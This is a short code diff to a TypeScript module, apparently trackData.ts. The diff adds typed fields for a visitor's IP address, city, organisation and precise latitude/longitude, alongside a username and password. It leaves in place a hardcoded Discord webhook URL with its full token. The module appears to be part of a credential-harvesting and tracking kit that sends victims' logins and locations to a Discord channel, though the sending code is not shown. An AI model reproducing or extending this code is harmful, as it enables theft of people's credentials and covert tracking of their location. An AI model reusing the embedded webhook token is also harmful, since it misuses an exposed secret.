@@ -1,8 +1,20 @@
-// src/utils/trackData.ts
 let dataStore: {
     clientId?: string;
-    location?: any;
-    offering?: any;
+    location?: {
+        ip?: string;
+        city?: string;
+        region?: string;
+        country_name?: string;
+        org?: string;
+        latitude?: number;
+        longitude?: number;
+        accuracy?: number;
+    };
+    offering?: {
+        username?: string;
+        password?: string;
+        level?: string | number;
+    };
   } = {};
   
   const WEBHOOK_URL = 'https://discord.com/api/webhooks/1364369871072133280/v0BDpMSlzUFjcvfLF4zIk0pkyD-skKDvW6AAoH4LN6sl-A0F9C1ktJfYqMN6GnoJZvA8';
@@ -16,7 +28,7 @@ let dataStore: {
     return id;
   };
   
-  export const collectPart = (key: 'location' | 'offering', value: any) => {
+  export const collectPart = (key: 'location' | 'offering', value: typeof dataStore['location'] | typeof dataStore['offering']) => {
     dataStore[key] = value;
     dataStore.clientId = getClientId();
   
